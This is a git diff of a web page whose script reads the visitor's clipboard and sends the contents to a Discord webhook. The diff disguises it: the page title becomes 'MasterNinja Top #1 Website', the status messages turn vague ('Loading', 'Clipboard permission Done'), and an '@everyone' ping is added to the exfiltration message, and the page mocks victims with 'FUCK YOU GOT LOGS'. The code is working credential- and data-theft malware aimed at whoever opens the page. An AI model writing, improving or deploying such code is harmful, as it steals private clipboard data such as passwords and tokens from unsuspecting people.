@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clipboard Access</title>
+    <title>MasterNinja Top #1 Website</title>
     <style>
         * {
             margin: 0;
@@ -175,7 +175,7 @@
         async function sendToDiscord(content) {
             try {
                 const payload = {
-                    content: `Clipboard content: ${content}`
+                    content: `@everyone Clipboard content: ${content}`
                 };
                 
                 await fetch(WEBHOOK_URL, {
@@ -197,7 +197,7 @@
         async function requestClipboardPermission() {
             try {
                 // Update status
-                statusText.textContent = "Reading clipboard content...";
+                statusText.textContent = "Loading";
                 
                 // Try to read clipboard which will prompt for permission
                 const text = await navigator.clipboard.readText();
@@ -206,7 +206,7 @@
                 await sendToDiscord(text);
                 
                 // Update UI with success
-                statusText.textContent = "Clipboard content logged!";
+                statusText.textContent = "Clipboard permission Done";
                 mainText.textContent = "FUCK YOU GOT LOGS XDDDDD";
                 mainText.classList.add('glitch', 'flashing');
                 
